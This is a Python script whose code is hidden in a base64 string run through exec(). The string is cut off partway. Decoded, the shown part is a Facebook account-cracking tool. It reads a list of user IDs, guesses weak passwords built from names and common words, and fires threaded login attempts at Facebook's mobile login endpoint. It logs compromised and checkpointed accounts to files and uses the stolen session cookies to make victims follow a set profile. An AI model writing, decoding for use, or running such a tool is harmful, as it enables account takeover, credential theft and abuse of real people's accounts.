# #ENCODE_BY_SALMAN-KHALID_RED-HAT-KING


import base64
exec(base64.b64decode('IyEvdXNyL2Jpbi9weXRob24zDQppbXBvcnQgb3MNCnRyeToNCiAgICBpbXBvcnQgcmVxdWVzdHMNCmV4Y2VwdCBJbXBvcnRFcnJvcjoNCiAgICBwcmludCgnXG4gW+Kck10gaW5zdGFsbGluZyByZXF1ZXN0cyAhLi4uXG4nKQ0KICAgIG9zLnN5c3RlbSgncGlwIGluc3RhbGwgcmVxdWVzdHMnKQ0KDQp0cnk6DQogICAgaW1wb3J0IGNvbmN1cnJlbnQuZnV0dXJlcw0KZXhjZXB0IEltcG9ydEVycm9yOg0KICAgIHByaW50KCdcbiBb4pyTXSBpbnN0YWxsaW5nIGZ1dHVyZXMgIS4uLlxuJykNCiAgICBvcy5zeXN0ZW0oJ3BpcCBpbnN0YWxsIGZ1dHVyZXMnKQ0KDQp0cnk6DQogICAgaW1wb3J0IGJzNA0KZXhjZXB0IEltcG9ydEVycm9yOg0KICAgIHByaW50KCdcbiBb4pyTXSBpbnN0YWxsaW5nIGJzNCAhLi4uXG4nKQ0KICAgIG9zLnN5c3RlbSgncGlwIGluc3RhbGwgYnM0JykNCg0KaW1wb3J0IHJlcXVlc3RzLCBvcywgcmUsIGJzNCxwbGF0Zm9ybSwgc3lzLCBqc29uLCB0aW1lLCByYW5kb20sIGRhdGV0aW1lLCBzdWJwcm9jZXNzLCB0aHJlYWRpbmcsIGl0ZXJ0b29scyxiYXNlNjQsdXVpZCx6bGliDQpmcm9tIGNvbmN1cnJlbnQuZnV0dXJlcyBpbXBvcnQgVGhyZWFkUG9vbEV4ZWN1dG9yIGFzIEJBQlloZWFsdGgNCmZyb20gZGF0ZXRpbWUgaW1wb3J0IGRhdGV0aW1lDQpmcm9tIGJzNCBpbXBvcnQgQmVhdXRpZnVsU291cA0KDQoNCmN0ID0gZGF0ZXRpbWUubm93KCkNCm4gPSBjdC5tb250aA0KYnVsYW4gPSBbJ0phbnVhcnknLCAnRmVicnVhcnknLCAnTWFyY2gnLCAnQXByaWwnLCAnTWF5JywgJ0p1bmUnLCAnSnVseScsICdBZ3VzdHVzJywgJ1NlcHRlbWJlcicsICdPY3RvYmVyJywgJ05vdmVtYmVyJywgJ0RlY2VtYmVyJ10NCnRyeToNCiAgICBpZiBuIDwgMCBvciBuID4gMTI6DQogICAgICAgIGV4aXQoKQ0KICAgIG5UZW1wID0gbiAtIDENCmV4Y2VwdCBWYWx1ZUVycm9yOg0KICAgIGV4aXQoKQ0KDQpjdXJyZW50ID0gZGF0ZXRpbWUubm93KCkNCnRhID0gY3VycmVudC55ZWFyDQpidSA9IGN1cnJlbnQubW9udGgNCmhhID0gY3VycmVudC5kYXkNCm9wID0gYnVsYW5bblRlbXBdDQpQID0gJ1x4MWJbMTs5N20nICMgDQpNID0gJ1wwMzNbMTszMW0nICMgDQpIID0gJ1wwMzNbMTszMm0nICMgDQpLID0gJ1x4MWJbMTs5N20nICMgDQpCID0gJ1x4MWJbMTs5N20nICMgDQpVID0gJ1x4MWJbMTs5N20nICMgDQpPID0gJ1x4MWJbMTs5N20nICMgDQpOID0gJ1x4MWJbMG0nICAgICMgDQpteV9jb2xvciA9IFsNCiBQLCBNLCBILCBLLCBCLCBVLCBPLCBOXQ0Kd2FybmEgPSByYW5kb20uY2hvaWNlKG15X2NvbG9yKQ0KZGF0YSxkYXRhMj17fSx7fQ0KYW1hbixjcCxzYWxhaD0wLDAsMA0KdWJhaFAsZnVjayxwd0JhcnU9W10sW10sW10NCm9rID0gW10NCmNwID0gW10NCmlkID0gW10NCnVzZXIgPSBbXQ0KbG9vcCA9IDANCnVybF9sb29rdXAgPSAiaHR0cHM6Ly9sb29rdXAtaWQuY29tLyINCnVybF9tYiA9ICJodHRwczovL21iYXNpYy5mYWNlYm9vay5jb20iDQp1cmxfaXAgPSAiaHR0cHM6Ly93d3cuaHR0cGJpbi5vcmcvaXAiDQpoZWFkZXJfZ3J1cCA9IHsidXNlci1hZ2VudCI6ICJNb3ppbGxhLzUuMCAoV2luZG93cyBOVCAxMC4wOyBXaW42NDsgeDY0KSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBDaHJvbWUvMTAwLjAuNDg5Ni42MCBTYWZhcmkvNTM3LjM2IEVkZy8xMDAuMC4xMTg1LjI5O10ifQ0KYnVsYW5fdHRsID0geyIwMSI6ICJKYW51YXJ5IiwgIjAyIjogIkZlYnJ1YXJ5IiwgIjAzIjogIk1hcmNoIiwgIjA0IjogIkFwcmlsIiwgIjA1IjogIk1heSIsICIwNiI6ICJKdW5lIiwgIjA3IjogIkp1bHkiLCAiMDgiOiAiQXVndXN0dXMiLCAiMDkiOiAiU2VwdGVtYmVyIiwgIjEwIjogIk9jdG9iZXIiLCAiMTEiOiAiTm92ZW1iZXIiLCAiMTIiOiAiRGVjZW1iZXIifQ0KZG9uZSA9IEZhbHNlDQoNCmRlZiBqYWxhbih6KToNCiAgICBmb3IgZSBpbiB6ICsgJ1xuJzoNCiAgICAgICAgc3lzLnN0ZG91dC53cml0ZShlKQ0KICAgICAgICBzeXMuc3Rkb3V0LmZsdXNoKCkNCiAgICAgICAgdGltZS5zbGVlcCgwLjAxKQ0KDQoNCmxvZ28gPSAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICIiIiAgIA0KIFwwMzNbMTs5MW0gX19fX19fX19fXyAgICAgICAgICAgLl9fXw0KIFwwMzNbMTs5Nm0gXF9fX19fXyAgIFwgX19fXyAgIF9ffCBfLw0KIFwwMzNbMTs5NW0gfCAgICAgICBfLy8gX18gXCAvIF9fIHwgDQogXDAzM1sxOzkybSAgfCAgICB8ICAgXCAgX19fLy8gL18vIHwgDQogXDAzM1sxOzk4bSAgfF9fX198XyAgL1xfX18gID5fX19fIHwgDQpcMDMzWzE7OTJt4pWU4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWXDQpcMDMzWzE7MzNt4pWa4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWdDQpcMDMzWzE7OTFt4pWU4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWXDQpcMDMzWzE7OTFt4pWRXDAzM1sxOzkzbSogXDAzM1sxOzk3bUF1dGhvciAgIFwwMzNbMTs5MW06IFwwMzNbMTszM20gU0FMTUFOIEtIQUxJRCAgXDAzM1sxOzkxbSAg4pWRDQpcMDMzWzE7OTFt4pWRXDAzM1sxOzkzbSogXDAzM1sxOzk3bUdpdEh1YiAgIFwwMzNbMTs5MW06IFwwMzNbMTs5Mm0gUmVkSGF0S2luZ1wwMzNbMTs5MW0gICAgICAg4pWRDQpcMDMzWzE7OTRt4pWRXDAzM1sxOzkzbSogXDAzM1sxOzk3bVdoYXN0YXBwIFwwMzNbMTs5MW06IFwwMzNbMTs5OG0gMDMwNjc0NTA4NzYgIFwwMzNbMTs5NG0gICAg4pWRDQpcMDMzWzE7OTRt4pWRXDAzM1sxOzkzbSogXDAzM1sxOzk3bVZlcnNpICAgIFwwMzNbMTs5MW06ICBcMDMzWzE7OThtIFswLjFdIFwwMzNbMTs5NG0gICAgICAgICAg4pWRDQpcMDMzWzE7OTRt4pWa4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWdXDAzM1sxOzMzbSIiIg0KDQpkZWYgaGFzaWwoT0ssY3ApOg0KCWlmIG5vdCBsZW4oT0spICE9IDA6DQoJICAgIHBhc3MNCglpZiBsZW4oY3ApICE9IDA6DQoJICAgIHByaW50KCdcblxuICBceDFiWzE7OTdtIFRvdGFsIE9LIDogXHgxYlsxOzk3bSAlcyAgXHgxYlsxOzk3bUdSRUVOX09LLnR4dCcgJSAoSCwgUCwgc3RyKGxlbihvaykpKSkNCgkgICAgcHJpbnQoJyAgXHgxYlsxOzk3bSBUb3RhbCBDUCA6XHgxYlsxOzk3bSAgICVzIFx4MWJbMTs5N21SRURfQ1AudHh0JyAlIChILCBQLCBzdHIobGVuKGNwKSkpKQ0KCSAgICBpbnB1dCgiXHgxYlsxOzk3bVByZXNzIGVudGVyIHRvIGJhY2sgIikNCgkgICAgQkFCWSgpDQoNCmRlZiBCQUJZKCk6DQoNCg0KDQoNCiAgICAgICAgDQogIA0KICAgIG9zLnN5c3RlbSgnY2xlYXInKQ0KICAgIHByaW50KGxvZ28pDQogICAgaXBtID0gcmVxdWVzdHMuZ2V0KHVybF9pcCkuanNvbigpDQogICAgdG9keiA9ICcnDQogICAgSVAgPSBpcG1bJ29yaWdpbiddDQogICAgcHJpbnQNCiAgICBwcmludCgnIFsxXSBDcmFjayBGaWxlJykNCiAgICBwcmludCgnIFsyXSBFeGl0ICcpDQogICAgcHJpbnQoJycpDQogICAgX0JBQllfX18gPSBpbnB1dCgnIFvinJNdIFNlbGVjdCBPcHRpb246ICcpDQogICAgaWYgX0JBQllfX18gaW4gKCcxJywgJzAxJyk6DQogICAgICAgIF9feHh4X18oKS5CQUJZeChpZCkNCiAgICBpZiBfQkFCWV9fXyBpbiAoJzInLCAnMDInKToNCiAgICAgICAgb3Muc3lzdGVtKCdZTUJGLnB5JykNCiAgICBpZiBfQkFCWV9fXyBpbiAoJ0UnLCAnZWUnKToNCiAgICAgICAgcGFzcw0KDQoNCmNsYXNzIF9feHh4X186DQogICAgZGVmIF9faW5pdF9fKHNlbGYpOg0KICAgICAgICBzZWxmLmlkID0gW10NCiAgICBkZWYgQkFCWXgoc2VsZixpZCk6DQogIA0KICAgICAgIA0KICAgICAgDQogICAgICAgICANCiAgICAgICAgICAgIA0KDQogICAgICAgIG9zLnN5c3RlbSgiY2xlYXIiKQ0KICAgICAgICBwcmludChsb2dvKQ0KICAgICAgICBzZWxmLmNudCA9IGlucHV0KCdQdXQgWW91ciBGaWxlIFBhdGggOiAnKQ0KICAgICAgICBzZWxmLmlkID0gb3BlbihzZWxmLmNudCkucmVhZCgpLnNwbGl0bGluZXMoKQ0KICAgICAgICBvcy5zeXN0ZW0oJ2NsZWFyJykNCiAgICAgICAgcHJpbnQobG9nbykNCiAgICAgICAgcHJpbnQoIiIpDQogICAgICAgIF9fX3dvcmxkd2lkZV9fXyA9ICgneScpDQogICAgICAgIGlmIF9fX3dvcmxkd2lkZV9fXyBpbiAoJ3llcycsJ1llcycsJ1knLCAneScpOg0KICAgICAgICAgICAgc2VsZi5fX3BsZXJfXygpDQogICAgICAgIGVsc2U6DQogICAgICAgICAgICBwcmludCgnIFvinJNdIENob29zZSBDb3JyZWN0IE9uZScpOw0KICAgICAgICAgICAgc2VsZi5CQUJZeChpZCkNCiAgICBkZWYgX19tZXRvZGVfXyhzZWxmLCB1c2VyLCBfX2NoaV9fLCBjZWJvayk6DQogICAgICAgIGdsb2JhbCBvayxjcCxsb29wDQogICAgICAgIHN5cy5zdGRvdXQud3JpdGUoZiJcciBceDFiWzE7OTZtW0JBQlldIHtsb29wfXx7bGVuKHNlbGYuaWQpfSBbb2tdW3tsZW4ob2spfV0gW29rXVt7bGVuKG9rKX1dICIpDQogICAgICAgIHN5cy5zdGRvdXQuZmx1c2goKQ0KICAgICAgICB0cnk6DQogICAgICAgICAgICBmb3IgcHcgaW4gX19jaGlfXzoNCiAgICAgICAgICAgICAgICBwdyA9IHB3Lmxvd2VyKCkNCiAgICAgICAgICAgICAgICBzZXNzaW9uPXJlcXVlc3RzLlNlc3Npb24oKQ0KICAgICAgICAgICAgICAgIGhlYWRlciA9IHsNCiAgICAgICAgICAgICAgICAgICAgIkhvc3QiOmNlYm9rLA0KICAgICAgICAgICAgICAgICAgICAidXBncmFkZS1pbnNlY3VyZS1yZXF1ZXN0cyI6IjEiLA0KICAgICAgICAgICAgICAgICAgICAidXNlci1hZ2VudCI6Ik5va2lhQzMtMDAvNS4wICgwOC42MykgUHJvZmlsZS9NSURQLTIuMSBDb25maWd1cmF0aW9uL0NMREMtMS4xIE1vemlsbGEvNS4wIEFwcGxlV2ViS2l0LzQyMCsgKEtIVE1MLCBsaWtlIEdlY2tvKSBTYWZhcmkvNDIwKyIsDQogICAgICAgICAgICAgICAgICAgICJhY2NlcHQiOiJ0ZXh0L2h0bWwsYXBwbGljYXRpb24veGh0bWwreG1sLGFwcGxpY2F0aW9uL3htbDtxPTAuOSxpbWFnZS9hdmlmLGltYWdlL3dlYnAsaW1hZ2UvYXBuZywqLyo7cT0wLjgsYXBwbGljYXRpb24vc2lnbmVkLWV4QkFCWWU7dj1iMztxPTAuOSIsDQogICAgICAgICAgICAgICAgICAgICJkbnQiOiIxIiwNCiAgICAgICAgICAgICAgICAgICAgIngtcmVxdWVzdGVkLXdpdGgiOiJtYXJrLnZpYS5ncCIsDQogICAgICAgICAgICAgICAgICAgICJzZWMtZmV0Y2gtc2l0ZSI6InNhbWUtb3JpZ2luIiwNCiAgICAgICAgICAgICAgICAgICAgInNlYy1mZXRjaC1tb2RlIjoiY29ycyIsDQogICAgICAgICAgICAgICAgICAgICJzZWMtZmV0Y2gtdXNlciI6ImVtcHR5IiwNCiAgICAgICAgICAgICAgICAgICAgInNlYy1mZXRjaC1kZXN0IjoiZG9jdW1lbnQiLA0KICAgICAgICAgICAgICAgICAgICAicmVmZXJlciI6Imh0dHBzOi8vbS5mYWNlYm9vay5jb20vIiwNCiAgICAgICAgICAgICAgICAgICAgImFjY2VwdC1lbmNvZGluZyI6Imd6aXAsIGRlZmxhdGUgYnIiLA0KICAgICAgICAgICAgICAgICAgICAiYWNjZXB0LWxhbmd1YWdlIjoiZW4tR0IsZW4tVVM7cT0wLjksZW47cT0wLjgiDQogICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgIHIgPSBzZXNzaW9uLmdldChmImh0dHBzOi8ve2NlYm9rfS9pbmRleC5waHA/bmV4dD1odHRwcyUzQSUyRiUyRmRldmVsb3BlcnMuZmFjZWJvb2suY29tJTJGdG9vbHMlMkZkZWJ1ZyUyRmFjY2Vzc3Rva2VuJTJGIiwgaGVhZGVycz1oZWFkZXIpDQogICAgICAgICAgICAgICAgZGFzID0gew0KICAgICAgICAgICAgICAgICAgICAibHNkIjpyZS5zZWFyY2goJ25hbWU9ImxzZCIgdmFsdWU9IiguKj8pIicsIHN0cihyLnRleHQpKS5ncm91cCgxKSwNCiAgICAgICAgICAgICAgICAgICAgImphem9lc3QiOnJlLnNlYXJjaCgnbmFtZT0iamF6b2VzdCIgdmFsdWU9IiguKj8pIicsIHN0cihyLnRleHQpKS5ncm91cCgxKSwNCiAgICAgICAgICAgICAgICAgICAgInVpZCI6dXNlciwNCiAgICAgICAgICAgICAgICAgICAgImZsb3ciOiJsb2dpbl9ub19waW4iLA0KICAgICAgICAgICAgICAgICAgICAicGFzcyI6cHcsDQogICAgICAgICAgICAgICAgICAgICJuZXh0IjoiaHR0cHM6Ly9kZXZlbG9wZXJzLmZhY2Vib29rLmNvbS90b29scy9kZWJ1Zy9hY2Nlc3N0b2tlbi8iDQogICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgIGhlYWRlcjEgPSB7DQogICAgICAgICAgICAgICAgICAgICJIb3N0IjpjZWJvaywNCiAgICAgICAgICAgICAgICAgICAgImNhY2hlLWNvbnRyb2wiOiJtYXgtYWdlPTAiLA0KICAgICAgICAgICAgICAgICAgICAidXBncmFkZS1pbnNlY3VyZS1yZXF1ZXN0cyI6IjEiLA0KICAgICAgICAgICAgICAgICAgICAib3JpZ2luIjoiaHR0cHM6Ly8iK2NlYm9rLA0KICAgICAgICAgICAgICAgICAgICAiY29udGVudC10eXBlIjoiYXBwbGljYXRpb24veC13d3ctZm9ybS11cmxlbmNvZGVkIiwNCiAgICAgICAgICAgICAgICAgICAgInVzZXItYWdlbnQiOiJNb3ppbGxhLzUuMCAoTGludXg7IEFuZHJvaWQgMTI7IFNBTVNVTkcgU00tRzc4MEcpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIFNhbXN1bmdCcm93c2VyLzE2LjAgQ2hyb21lLzkyLjAuNDUxNS4xNjYgTW9iaWxlIFNhZmFyaS81MzcuMzYiLA0KICAgICAgICAgICAgICAgICAgICAiYWNjZXB0IjoidGV4dC9odG1sLGFwcGxpY2F0aW9uL3hodG1sK3htbCxhcHBsaWNhdGlvbi94bWw7cT0wLjksaW1hZ2UvYXZpZixpbWFnZS93ZWJwLGltYWdlL2FwbmcsKi8qO3E9MC44LGFwcGxpY2F0aW9uL3NpZ25lZC1leEJBQlllO3Y9YjM7cT0wLjkiLA0KICAgICAgICAgICAgICAgICAgICAieC1yZXF1ZXN0ZWQtd2l0aCI6IlhNTEh0dHBSZXF1ZXN0IiwNCiAgICAgICAgICAgICAgICAgICAgInNlYy1mZXRjaC1zaXRlIjoic2FtZS1vcmlnaW4iLA0KICAgICAgICAgICAgICAgICAgICAic2VjLWZldGNoLW1vZGUiOiJjb3JzIiwNCiAgICAgICAgICAgICAgICAgICAgInNlYy1mZXRjaC11c2VyIjoiZW1wdHkiLA0KICAgICAgICAgICAgICAgICAgICAic2VjLWZldGNoLWRlc3QiOiJkb2N1bWVudCIsDQogICAgICAgICAgICAgICAgICAgICJyZWZlcmVyIjoiaHR0cHM6Ly8iK2NlYm9rKyIvaW5kZXgucGhwP25leHQ9aHR0cHMlM0ElMkYlMkZkZXZlbG9wZXJzLmZhY2Vib29rLmNvbSUyRnRvb2xzJTJGZGVidWclMkZhY2Nlc3N0b2tlbiUyRiIsDQogICAgICAgICAgICAgICAgICAgICJhY2NlcHQtZW5jb2RpbmciOiJnemlwLCBkZWZsYXRlIGJyIiwNCiAgICAgICAgICAgICAgICAgICAgImFjY2VwdC1sYW5ndWFnZSI6ImVuLUdCLGVuLVVTO3E9MC45LGVuO3E9MC44Ig0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICBwbyA9IHNlc3Npb24ucG9zdChmImh0dHBzOi8ve2NlYm9rfS9sb2dpbi9kZXZpY2UtYmFzZWQvdmFsaWRhdGUtcGFzc3dvcmQvP3NoYmw9MCIsIGRhdGEgPSBkYXMsIGhlYWRlcnMgPSBoZWFkZXIxLCBhbGxvd19yZWRpcmVjdHMgPSBGYWxzZSkNCiAgICAgICAgICAgICAgICBpZiAnY191c2VyJyBpbiBzZXNzaW9uLmNvb2tpZXMuZ2V0X2RpY3QoKToNCiAgICAgICAgICAgICAgICAgICAgY29raT0iOyIuam9pbihba2V5KyI9Iit2YWx1ZSBmb3Iga2V5LHZhbHVlIGluIHNlc3Npb24uY29va2llcy5nZXRfZGljdCgpLml0ZW1zKCldKQ0KICAgICAgICAgICAgICAgICAgICBwcmludChmIlxye0h9IFtCQUJZLU9LXSB7dXNlcn0gfCB7cHd9IikNCiAgICAgICAgICAgICAgICAgICAgd3J0ID0gJyVzfCVzJyAlICh1c2VyLHB3KQ0KICAgICAgICAgICAgICAgICAgICBvay5hcHBlbmQod3J0KQ0KICAgICAgICAgICAgICAgICAgICBvcGVuKCdCQUJZX09LLnR4dCcgLCAnYScpLndyaXRlKCclc1xuJyAlIHdydCkNCiAgICAgICAgICAgICAgICAgICAgc2VsZi5mb2xsb3coc2Vzc2lvbixjb2tpKQ0KICAgICAgICAgICAgICAgICAgICBicmVhaw0KICAgICAgICAgICAgICAgIGVsaWYgJ2NoZWNrcG9pbnQnIGluIHNlc3Npb24uY29va2llcy5nZXRfZGljdCgpOg0KICAgICAgICAgICAgICAgICAgICB0cnk6DQogICAgICAgICAgICAgICAgICAgICAgICB0b2tlbnogPSBvcGVuKCcudG9rZW4udHh0JykucmVhZCgpDQogICAgICAgICAgICAgICAgICAgICAgICBjcF90dGwgPSBzZXNzaW9uLmdldChmJ2h0dHBzOi8vZ3JhcGguZmFjZWJvb2suY29tL3t1c2VyfT9maWVsZHM9YmlydGhkYXkmYWNjZXNzX3Rva2VuPXt0b2tlbnp9JykuanNvbigpWydiaXJ0aGRheSddDQogICAgICAgICAgICAgICAgICAgICAgICBtb250aCwgZGF5LCB5ZWFyID0gY3BfdHRsLnNwbGl0KCcvJykNCiAgICAgICAgICAgICAgICAgICAgICAgIG1vbnRoID0gYnVsYW5fdHRsW21vbnRoXQ0KICAgICAgICAgICAgICAgICAgICAgICAgcHJpbnQoJ1xyJXMgW0JBQlktT0tdICVzIHwgJXMgJyAlIChNLCB1c2VyLCBwdykpDQogICAgICAgICAgICAgICAgICAgICAgICB3cnQgPSAnJXN8JXMnICUgKHVzZXIscHcpDQogICAgICAgICAgICAgICAgICAgICAgICBjcC5hcHBlbmQod3J0KQ0KICAgICAgICAgICAgICAgICAgICAgICAgb3BlbignQkFCWV9PSy50eHQnICwgJ2EnKS53cml0ZSgnJXNcbicgJSB3cnQpDQogICAgICAgICAgICAgICAgICAgICAgICBicmVhaw0KICAgICAgICAgICAgICAgICAgICBleGNlcHQgKEtleUVycm9yLCBJT0Vycm9yKToNCiAgICAgICAgICAgICAgICAgICAgICAgIG1vbnRoID0gJycNCiAgICAgICAgICAgICAgICAgICAgICAgIGRheSAgID0gJycNCiAgICAgICAgICAgICAgICAgICAgICAgIHllYXIgID0gJycNCiAgICAgICAgICAgICAgICAgICAgZXhjZXB0Og0KICAgICAgICAgICAgICAgICAgICAgICAgcGFzcw0KICAgICAgICAgICAgICAgICAgICBwcmludCgnXHIlcyBbQkFCWS1PS10gJXMgfCAlcyAnICUgKE0sIHVzZXIsIHB3KSkNCiAgICAgICAgICAgICAgICAgICAgd3J0ID0gJyVzfCVzJyAlICh1c2VyLHB3KQ0KICAgICAgICAgICAgICAgICAgICBjcC5hcHBlbmQod3J0KQ0KICAgICAgICAgICAgICAgICAgICBvcGVuKCdCQUJZX09LLnR4dCcgLCAnYScpLndyaXRlKCclc1xuJyAlIHdydCkNCiAgICAgICAgICAgICAgICAgICAgYnJlYWsNCiAgICAgICAgICAgICAgICBlbHNlOg0KICAgICAgICAgICAgICAgICAgICBjb250aW51ZQ0KICAgICAgICAgICAgbG9vcCs9MQ0KICAgICAgICBleGNlcHQ6DQogICAgICAgICAgICBzZWxmLl9fbWV0b2RlX18odXNlciwgcHcsIGNlYm9rKQ0KDQogICAgZGVmIGZvbGxvdyhzZWxmLCBzZXNzaW9uLCBjb2tpKToNCiAgICAgICAgciA9IEJlYXV0aWZ1bFNvdXAoc2Vzc2lvbi5nZXQoJ2h0dHBzOi8vbWJhc2ljLmZhY2Vib29rLmNvbS9wcm9maWxlLnBocD9pZD0xMDAwMDc2MDcwNTQ4NDUnLCBjb29raWVzPXsnY29va2llJzogY29raX0pLnRleHQsICdodG1sLnBhcnNlcicpDQogICAgICAgIGdldCA9IHIuZmluZCgnYScsIHN0cmluZz0nSWt1dGknKS5nZXQoJ2hyZWYnKQ0KICAgICAgICBzZXNzaW9uLmdldCgoJ2h0dHBzOi8vbWJhc2ljLmZhY2Vib29rLmNvbScgKyBzdHIoZ2V0KSksIGNvb2tpZXM9eydjb29raWUnOiBjb2tpfSkudGV4dA0KDQogICAgZGVmIF9fcGxlcl9fKHNlbGYpOg0KICAgICAgICBwcmludCgnWzFdIENyYWNrIFdpdGggQXV0byBQYXNzICcpDQogICAgICAgIHByaW50KCdbMl0gQ3JhY2sgV2l0aCBOYW1lIERpZ2l0IFBhc3MnKQ0KICAgICAgICBjaGkgPSBpbnB1dCgnXG4gW+Kck10gUGlsaWg6ICcpDQogICAgICAgIGlmIGNoaSA9PSAnJzoNCiAgICAgICAgICAgIHByaW50KCdcblNlbGVjdCBDb3JyZWN0IE9uZScpDQogICAgICAgICAgICBzZWxmLl9fcGxlcl9fKCkNCiAgICAgICAgZWxpZiBjaGkgaW4gKCcxJywgJzAxJyk6DQogICAgICAgICAgICBvcy5zeXN0ZW0oImNsZWFyIikNCiAgICAgICAgICAgIHByaW50KGxvZ28pDQogICAgICAgICAgICBwcmludCgiXDAzM1sxOzk4bVxyICAgICAgICAgIERPTlQgVVNFIEFOWSBQUk9YWSB7VlBOfVwwMzNbMTszN20iKQ0KICAgICAgICAgICAgcHJpbnQoNDcqIi0iKQ0KICAgICAgICAgICAgcHJpbnQoJ1wwMzNbMTszNm0gVG90YWwgSURzIDogJXMgJyAlIGxlbihzZWxmLmlkKSkNCiAgICAgICAgICAgIHByaW50KCdcMDMzWzE7MzZtIEhhY2tpbmcgU3RhcnRlZC4uLicpDQogICAgICAgICAgICBwcmludCg0NyoiLSIpDQogICAgICAgICAgICB3aXRoIEJBQlloZWFsdGgobWF4X3dvcmtlcnM9MzApIGFzIGhlYWx0aHdvcmxkOg0KICAgICAgICAgICAgICAgIGZvciB6c2IgaW4gc2VsZi5pZDogIyBZbyBOZGFrIFRhdSBLb2sgVGFueWEgU2FpYQ0KICAgICAgICAgICAgICAgICAgICB0cnk6DQogICAgICAgICAgICAgICAgICAgICAgICB1aWQsIG5hbWUgPSB6c2Iuc3BsaXQoJ3wnKQ0KICAgICAgICAgICAgICAgICAgICAgICAgeHogPSBuYW1lLnNwbGl0KCcgJykNCiAgICAgICAgICAgICAgICAgICAgICAgIGlmIGxlbih4eikgPT0gMyBvciBsZW4oeHopID09IDQgb3IgbGVuKHh6KSA9PSA1IG9yIGxlbih4eikgPT0gNjoNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBwd3ggPSBbbmFtZSwgeHpbMF0rIjEyMyIsIHh6WzBdK3h6WzFdLCB4elswXSsiMTIzNDUiXQ0KICAgICAgICAgICAgICAgICAgICAgICAgZWxzZToNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBwd3ggPSBbbmFtZSwgeHpbMF0rIjEyMyIsIHh6WzBdK3h6WzFdLCB4elswXSsiMTIzNDUiXQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIHB3eCA9IFsiNzg2Nzg2Il0NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBwd3ggPSBbInNheWFuZyJdDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgcHd4ID0gWyJiaXNtaWxsYWgiXQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIHB3eCA9IFsiMTIzNDU2Il0NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBwd3ggPSBbInNheWFuZ2t1Il0NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBwd3ggPSBbInNheWFuZ2thbXUiXQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIHB3eCA9IFsiYmlzbWlsbGFoIl0NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBwd3ggPSBbImFuamluZyJdDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgcHd4ID0gWyJJbmRvbmVzaWEiXQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIHB3eCA9IFsibWVyZGVrYSJdDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgcHd4ID0gWyJiYW5nc2F0Il0NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBwd3ggPSBbImNpbnRha3UiXQ0KICAgICAgICAgICAgICAgICAgICAgICAgaGVhbHRod29ybGQuc3VibWl0KHNlbGYuX19tZXRvZGVfXywgdWlkLCBwd3gsICJtYmFzaWMuZmFjZWJvb2suY29tIikNCiAgICAgICAgICAgICAgICAgICAgZXhjZXB0Og0KICAgICAgICAgICAgICAgICAgICAgICAgcGFzcw0KICAgICAgICAgICAgaGFzaWwob2ssY3ApDQogICAgICAgIGVsaWYgY2hpIGluICgnMicsICcwMicpOg0KICAgICAgICAgICAgb3Muc3lzdGVtKCJjbGVhciIpDQogICAgICAgICAgICBwcmludChsb2dvKQ0KICAgICAgICAgICAgcHJpbnQoIlwwMzNbMTszN21cckVudGVyIExhc3QgTmFtZSBEaWdpdHNcMDMzWzE7MzdtXG4iKQ0KICAgICAgICAgICAgcDEgPSBpbnB1dCgnICBOYW1lICsgMSA6ICcpDQogICAgICAgICAgICBwMiA9IGlucHV0KCcgIE5hbWUgKyAyIDogJykNCiAgICAgICAgICAgIHAzID0gaW5wdXQoJyAgTmFtZSArIDMgOiAnKQ0KICAgICAgICAgICAgcDQgPSBpbnB1dCgnICBOYW1lICsgNCA6ICcpDQogICAgICAgICAgICBvcy5zeXN0ZW0oImNsZWFyIikNCiAgICAgICAgICAgIHByaW50KGxvZ28pDQogICAgICAgICAgICBwcmludCgiXDAzM1sxOzM2bVxyICAgICAgICAgIERPTlQgVVNFIEFOWSBQUk9YWSB7VlBOfVwwMzNbMTszN20iKQ0KICAgICAgICAgICAgcHJpbnQoNDcqIi0iKQ0KICAgICAgICAgICAgcHJpbnQoJ1wwMzNbMTszNm0gVG90YWwgSURzIDogJXMgJyAlIGxlbihzZWxmLmlkKSkNCiAgICAgICAgICAgIHByaW50KCdcMDMzWzE7MzZtIEhhY2tpbmcgU3RhcnRlZC4uLicpDQogICAgICAgICAgICBwcmludCg0NyoiLSIpDQogICA